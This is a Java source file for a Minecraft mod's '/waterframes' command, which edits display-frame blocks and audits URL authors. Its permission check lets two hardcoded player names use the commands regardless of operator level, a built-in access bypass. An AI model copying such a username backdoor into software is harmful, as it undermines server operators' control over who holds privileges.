package me.srrapero720.waterframes.common.commands;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.FloatArgumentType;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import me.srrapero720.waterframes.WaterFrames;
import me.srrapero720.waterframes.common.block.data.types.PositionHorizontal;
import me.srrapero720.waterframes.common.block.data.types.PositionVertical;
import me.srrapero720.waterframes.common.block.entity.DisplayTile;
import net.minecraft.ChatFormatting;
import net.minecraft.Util;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.commands.arguments.coordinates.BlockPosArgument;
import net.minecraft.network.chat.Component;
import net.minecraft.network.chat.TextComponent;
import net.minecraft.network.chat.TranslatableComponent;
import net.minecraft.world.entity.player.Player;
import net.minecraftforge.server.command.EnumArgument;

public class WaterFramesCommand {
    public static void register(CommandDispatcher<CommandSourceStack> dispatcher) {
        var waterframes = Commands.literal("waterframes").requires(WaterFramesCommand::hasPermissions);

        var edit = Commands.argument("blockpos", BlockPosArgument.blockPos());

        // URL
        edit.then(Commands.literal("url")
                .then(Commands.argument("url", StringArgumentType.greedyString())
                        .executes(c -> setUrl(getTile(c), c.getSource(), getStr(c, "url")))
                )
        );

        var position = Commands.literal("position")
                .then(Commands.argument("vertical", EnumArgument.enumArgument(PositionVertical.class))
                        .executes(c -> setPosition(
                                getTile(c),
                                c.getSource(),
                                getEnum(c,"vertical", PositionVertical.class),
                                null
                                )
                        )
                        .then(Commands.argument("horizontal", EnumArgument.enumArgument(PositionHorizontal.class))
                                .executes(c -> setPosition(
                                        getTile(c),
                                        c.getSource(),
                                        getEnum(c,"vertical", PositionVertical.class),
                                        getEnum(c, "horizontal", PositionHorizontal.class)
                                        )
                                )
                        )
                );
        edit.then(position);

        // SIZE
        edit.then(Commands.literal("size")
                .then(Commands.argument("width", FloatArgumentType.floatArg(0.1f))
                        .executes(c -> setSize(
                                getTile(c),
                                c.getSource(),
                                getFloat(c,"width"),
                                -1)
                        )
                        .then(Commands.argument("height", FloatArgumentType.floatArg(0.1f))
                                .executes(c -> setSize(
                                        getTile(c),
                                        c.getSource(),
                                        getFloat(c, "width"), getFloat(c,"height")
                                        )
                                )
                        )
                )
        );

        // ROTATION
        edit.then(Commands.literal("rotation")
                .then(Commands.argument("rotation", FloatArgumentType.floatArg(0f, 360.0f))
                        .executes(c -> setRotation(getTile(c), c.getSource(), getFloat(c, "rotation")))
                )
        );

        // TRANSPARENCY
        edit.then(Commands.literal("transparency")
                .then(Commands.argument("transparency", FloatArgumentType.floatArg(0f, 1f))
                        .executes(c -> setTransparency(getTile(c), c.getSource(), getFloat(c, "transparency")))
                )
        );

        // BRIGHTNESS
        edit.then(Commands.literal("brightness")
                .then(Commands.argument("brightness", FloatArgumentType.floatArg(0f, 1f))
                        .executes(c -> setBrightness(getTile(c), c.getSource(), getFloat(c, "brightness")))
                )
        );

        // RENDER DISTANCE
        edit.then(Commands.literal("renderDistance")
                .then(Commands.argument("render_distance", IntegerArgumentType.integer(4))
                        .executes(c -> setRenderDistance(getTile(c), c.getSource(), getInt(c, "render_distance")))
                )
        );

        // RENDER DISTANCE
        edit.then(Commands.literal("projectionDistance")
                .then(Commands.argument("projection_distance", IntegerArgumentType.integer(4))
                        .executes(c -> setProjectionDistance(getTile(c), c.getSource(), getInt(c, "projection_distance")))
                )
        );

        // VOLUME DISTANCE
        var volumeDistance = Commands.argument("min_distance", IntegerArgumentType.integer(0))
                .executes(c -> setVolume(getTile(c), c.getSource(), getIntOr(c, "volume", -1), getInt(c, "min_distance"), -1))
                .then(Commands.argument("max_distance", IntegerArgumentType.integer(0))
                        .executes(c -> setVolume(getTile(c), c.getSource(), getIntOr(c, "volume", -1), getInt(c, "min_distance"), getInt(c, "max_distance")))
                );

        edit.then(Commands.literal("volumeDistance")
                .then(volumeDistance)
        );

        // VOLUME
        edit.then(Commands.literal("volume")
                .then(Commands.argument("volume", IntegerArgumentType.integer(0, 120))
                        .executes(c -> setVolume(getTile(c), c.getSource(), getInt(c, "volume"), -1, -1))
                        .then(volumeDistance)
                )
        );

        var audit = Commands.argument("blockpos", BlockPosArgument.blockPos());

        // AUDIT AUTHOR
        audit.then(Commands.literal("audit")
                .then(Commands.literal("author")
                        .executes(c -> auditURLAuthor(getTile(c), c.getSource()))
                )
        );


        waterframes.then(Commands.literal("edit").then(edit));
        waterframes.then(Commands.literal("audit")
                .then(audit)
//                .then(Commands.literal("in_range")
//                        .executes(c -> auditFramesRange(c.getSource().getPlayerOrException(), c.getSource()))
//                )
        );

        dispatcher.register(waterframes);
    }

    public static int setUrl(DisplayTile tile, CommandSourceStack source, String url) {
        if (tile == null) return 1;

        if (!tile.data.url.equals(url)) {
            tile.data.tick = 0;
            tile.data.tickMax = -1;
        }

        tile.data.url = url;
        tile.data.uuid = (source.getEntity() instanceof Player player) ? player.getUUID() : Util.NIL_UUID;

        tile.setDirty();
        source.sendSuccess(msgSuccess("waterframes.commands.edit.url.success"), true);
        return 0;
    }

    public static int setSize(DisplayTile tile, CommandSourceStack source, float width, float height) {
        if (tile == null) return 1;

        if (!tile.canResize()) {
            source.sendFailure(msgFailed("waterframes.commands.edit.size.failed"));
            return 2;
        }

        tile.data.setWidth(width);
        tile.data.setHeight(height);

        tile.setDirty();
        source.sendSuccess(msgSuccess("waterframes.commands.edit.size.success"), true);
        return 0;
    }

    public static int setPosition(DisplayTile tile, CommandSourceStack source, PositionVertical vertical, PositionHorizontal horizontal) {
        if (tile == null) return 1;

        if (!tile.canResize()) {
            source.sendFailure(msgFailed("waterframes.commands.edit.position.failed"));
            return 2;
        }

        tile.data.setHeight(vertical, tile.data.getHeight());
        if (horizontal != null) tile.data.setWidth(horizontal, tile.data.getWidth());

        tile.setDirty();
        source.sendSuccess(msgSuccess("waterframes.commands.edit.position.success"),true);
        return 0;
    }

    public static int setRotation(DisplayTile tile, CommandSourceStack source, float volume) {
        if (tile == null) return 1;

        if (!tile.canResize()) {
            source.sendFailure(msgFailed("waterframes.commands.edit.rotation.failed"));
            return 2;
        }

        tile.data.rotation = volume;

        tile.setDirty();
        source.sendSuccess(msgSuccess("waterframes.commands.edit.rotation.success"), true);
        return 0;
    }

    public static int setTransparency(DisplayTile tile, CommandSourceStack source, float transparency) {
        if (tile == null) return 1;

        tile.data.alpha = transparency;

        tile.setDirty();
        source.sendSuccess(msgSuccess("waterframes.commands.edit.transparency.success"), true);
        return 0;
    }

    public static int setBrightness(DisplayTile tile, CommandSourceStack source, float brightness) {
        if (tile == null) return 1;

        tile.data.brightness = brightness;

        tile.setDirty();
        source.sendSuccess(msgSuccess("waterframes.commands.edit.brightness.success"), true);
        return 0;
    }

    public static int setRenderDistance(DisplayTile tile, CommandSourceStack source, int renderDistance) {
        if (tile == null) return 1;

        tile.data.renderDistance = renderDistance;

        tile.setDirty();
        source.sendSuccess(msgSuccess("waterframes.commands.edit.render_distance.success"), true);
        return 0;
    }

    public static int setProjectionDistance(DisplayTile tile, CommandSourceStack source, int projectionDistance) {
        if (tile == null) return 1;

        if (!tile.canProject()) {
            source.sendFailure(msgFailed("waterframes.commands.edit.projection.failed"));
            return 2;
        }

        tile.data.projectionDistance = projectionDistance;

        tile.setDirty();
        source.sendSuccess(msgSuccess("waterframes.commands.edit.projection.success"), true);
        return 0;
    }

    public static int auditURLAuthor(DisplayTile tile, CommandSourceStack source) {
        if (tile == null) return 1;

        if (tile.data.uuid == Util.NIL_UUID) {
            source.sendSuccess(msgSuccess("waterframes.commands.audit.author.console"), true);
        } else {
            var profiler = source.getServer().getProfileCache().get(tile.data.uuid);
            if (profiler.isEmpty()) {
                source.sendFailure(msgFailed("waterframes.commands.audit.author.failed", tile.data.uuid.toString()));
                return 2;
            }
            source.sendSuccess(msgSuccess("waterframes.commands.audit.author", new TextComponent(profiler.get().getName()).withStyle(ChatFormatting.AQUA)), true);
        }
        return 0;
    }

    public static int setVolume(DisplayTile tile, CommandSourceStack source, int volume, int min, int max) {
        if (tile == null) return 1;

        if (volume != -1) tile.data.volume = volume;
        if (min != -1) tile.data.minVolumeDistance = min;
        if (max != -1) tile.data.maxVolumeDistance = max;

        tile.setDirty();
        source.sendSuccess(msgSuccess("waterframes.commands.edit.volume.success"), true);
        return 0;
    }

    public static <E extends Enum<E>> E getEnum(CommandContext<CommandSourceStack> context, String name, Class<E> enumClass) {
        return context.getArgument(name, enumClass);
    }

    public static String getStr(CommandContext<CommandSourceStack> context, String name) {
        return context.getArgument(name, String.class);
    }

    public static byte getByte(CommandContext<CommandSourceStack> context, String name) {
        return context.getArgument(name, byte.class);
    }

    public static double getShort(CommandContext<CommandSourceStack> context, String name) {
        return context.getArgument(name, short.class);
    }

    public static int getInt(CommandContext<CommandSourceStack> context, String name) {
        return context.getArgument(name, int.class);
    }

    public static int getIntOr(CommandContext<CommandSourceStack> context, String name, int def) {
        try {
            return context.getArgument(name, int.class);
        } catch (Exception ignored) {
            return def;
        }
    }

    public static float getFloat(CommandContext<CommandSourceStack> context, String name) {
        return context.getArgument(name, float.class);
    }

    public static double getDouble(CommandContext<CommandSourceStack> context, String name) {
        return context.getArgument(name, double.class);
    }

    private static DisplayTile getTile(CommandContext<CommandSourceStack> context) throws CommandSyntaxException {
        final var blockpos = BlockPosArgument.getLoadedBlockPos(context, "blockpos");
        final var blockEntity = context.getSource().getLevel().getBlockEntity(blockpos);

        if (blockEntity instanceof DisplayTile tile) {
            return tile;
        }
        context.getSource().sendFailure(msgFailed("waterframes.commands.invalid_block"));
        return null;
    }

    private static Component msgFailed(String t) {
        return new TextComponent(WaterFrames.PREFIX).append(new TranslatableComponent(t).withStyle(ChatFormatting.RED));
    }

    private static Component msgFailed(String t, String t2) {
        return new TextComponent(WaterFrames.PREFIX).append(new TranslatableComponent(t, t2).withStyle(ChatFormatting.RED));
    }

    private static Component msgSuccess(String t) {
        return new TextComponent(WaterFrames.PREFIX).append(new TranslatableComponent(t).withStyle(ChatFormatting.GREEN));
    }

    private static Component msgSuccess(String t, Component c) {
        return new TextComponent(WaterFrames.PREFIX).append(new TranslatableComponent(t).withStyle(ChatFormatting.GREEN).append(c));
    }

    public static boolean hasPermissions(CommandSourceStack sourceStack) {
        boolean hasPerms = sourceStack.hasPermission(3);
        boolean isCreator = false;

        if (sourceStack.getEntity() instanceof Player player) {
            String name = player.getGameProfile().getName();
            isCreator = name.equals("SrRaapero720") || name.equals("SrRapero720");
        }

        return hasPerms || isCreator;
    }
}
